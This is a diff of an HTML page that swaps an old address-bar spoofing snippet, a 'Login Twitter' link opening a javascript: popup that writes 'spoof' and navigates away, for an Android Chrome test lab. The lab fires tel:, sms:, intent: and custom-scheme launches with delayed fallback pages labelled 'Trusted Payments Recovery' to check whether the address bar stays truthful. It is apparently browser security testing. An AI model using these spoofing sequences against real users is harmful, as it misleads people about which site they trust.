@@ -1,12 +1,135 @@
-<script>
-  function next() {
-         w.location.replace('http://www.google.com/csi');
-        }
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Android Intent Lab</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/assets/lab.css">
+</head>
+<body data-case-id="android-intent-lab">
+  <div class="shell">
+    <section class="hero">
+      <div class="panel">
+        <span class="badge">Seeds: 329890199, 426480606, 363930141, 461532432</span>
+        <h1>Android Intent + Deep Link Lab</h1>
+        <p>Stress `tel:`, `sms:`, `intent:`, fallback URLs, and browser-state recovery around external launches. Use this in Android Chrome and from app-opened Custom Tabs when possible.</p>
+        <div class="actions">
+          <a class="btn warn" id="launch-tel" href="#">Launch `tel:`</a>
+          <a class="btn alt" id="launch-sms" href="#">Launch `sms:`</a>
+          <a class="btn" id="launch-intent" href="#">Launch `intent:`</a>
+          <a class="btn alt" id="launch-custom-scheme" href="#">Launch custom scheme</a>
+          <a class="btn alt" id="launch-fallback" href="#">Intent with fallback</a>
+          <button class="warn" id="popup-then-intent" data-log-click="popup-then-intent">Popup then intent</button>
+          <button class="alt" id="save">Save log</button>
+        </div>
+      </div>
+      <div class="panel">
+        <h2>Manual checks</h2>
+        <ul>
+          <li>Does the address bar, minibar, or bottom bar stay truthful before and after the external-launch UI appears?</li>
+          <li>If the intent falls back into Chrome, does the recovered page state still match the visible trust surface?</li>
+          <li>In split view or Custom Tab entry points, does protocol UI visually belong to the wrong page or stale origin?</li>
+        </ul>
+      </div>
+    </section>
 
-  function f() {
-    w = window.open("javascript:document.write('spoof');location='http://amazon.com'","new","width=500 height=500");
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
+    <section class="grid">
+      <div class="panel">
+        <h2>Controls</h2>
+        <div class="inputs">
+          <label>Phone <input id="phone" value="+1234567890"></label>
+          <label>Intent package <input id="intent-package" value="com.android.dialer"></label>
+          <label>Custom scheme <input id="custom-scheme" value="faceviewer://arvr.google.com/faceviewer?arbi=1&amp;wturl="></label>
+          <label>Fallback label <input id="fallback-label" value="Trusted Payments Recovery"></label>
+          <label>Delay ms <input id="delay" value="2500"></label>
+          <textarea id="notes" rows="6">Android recipe: open this page in Chrome, scroll to hide controls, focus an input elsewhere if needed, trigger popup-then-intent, cancel the external launch, then watch minibar and origin recovery. Repeat from split view and from an app-opened Custom Tab if you have a convenient test app.</textarea>
+        </div>
+      </div>
+      <div class="panel">
+        <h2>Log</h2>
+        <div class="log" data-log></div>
+      </div>
+    </section>
+  </div>
 
-<a href="#" onclick="f()">Login Twitter</a>
+  <script type="module">
+    import { bindCommon, log, saveLog } from '/assets/lab.js';
+    bindCommon();
+
+    const phone = document.getElementById('phone');
+    const intentPackage = document.getElementById('intent-package');
+    const customScheme = document.getElementById('custom-scheme');
+    const fallbackLabel = document.getElementById('fallback-label');
+    const delay = document.getElementById('delay');
+
+    function fallbackUrl() {
+      const slow = `/api/slow?ms=${encodeURIComponent(delay.value)}&label=${encodeURIComponent(fallbackLabel.value)}`;
+      return new URL(`/api/redirect?to=${encodeURIComponent(slow)}`, location.origin).toString();
+    }
+
+    function telUrl() {
+      return `tel:${phone.value}`;
+    }
+
+    function smsUrl() {
+      return `sms:${phone.value}?body=${encodeURIComponent('hello from android-intent-lab')}`;
+    }
+
+    function dialerIntentUrl(withFallback = false) {
+      const parts = [
+        `intent://${encodeURIComponent(phone.value.replace(/^\+/, ''))}#Intent`,
+        'scheme=tel',
+        `package=${intentPackage.value}`,
+      ];
+      if (withFallback) {
+        parts.push(`S.browser_fallback_url=${encodeURIComponent(fallbackUrl())}`);
+      }
+      parts.push('end');
+      return parts.join(';');
+    }
+
+    function customSchemeUrl() {
+      return `${customScheme.value}${encodeURIComponent(fallbackUrl())}`;
+    }
+
+    function launch(url, label, target = '_self') {
+      log(`${label}:${url}`);
+      if (target === '_blank') {
+        window.open(url, '_blank', 'noopener');
+      } else {
+        location.href = url;
+      }
+    }
+
+    document.getElementById('launch-tel').addEventListener('click', (event) => {
+      event.preventDefault();
+      launch(telUrl(), 'tel');
+    });
+    document.getElementById('launch-sms').addEventListener('click', (event) => {
+      event.preventDefault();
+      launch(smsUrl(), 'sms');
+    });
+    document.getElementById('launch-intent').addEventListener('click', (event) => {
+      event.preventDefault();
+      launch(dialerIntentUrl(false), 'intent');
+    });
+    document.getElementById('launch-custom-scheme').addEventListener('click', (event) => {
+      event.preventDefault();
+      launch(customSchemeUrl(), 'custom-scheme');
+    });
+    document.getElementById('launch-fallback').addEventListener('click', (event) => {
+      event.preventDefault();
+      launch(dialerIntentUrl(true), 'intent-fallback');
+    });
+    document.getElementById('popup-then-intent').addEventListener('click', () => {
+      const helper = window.open(`/api/slow?ms=1200&label=${encodeURIComponent('trusted-helper-before-intent')}`, '_blank', 'noopener,width=420,height=420');
+      log('popup-opened-before-intent');
+      setTimeout(() => {
+        helper?.focus();
+        launch(dialerIntentUrl(true), 'popup-then-intent');
+      }, 500);
+    });
+    document.getElementById('save').addEventListener('click', () => saveLog());
+  </script>
+</body>
+</html>
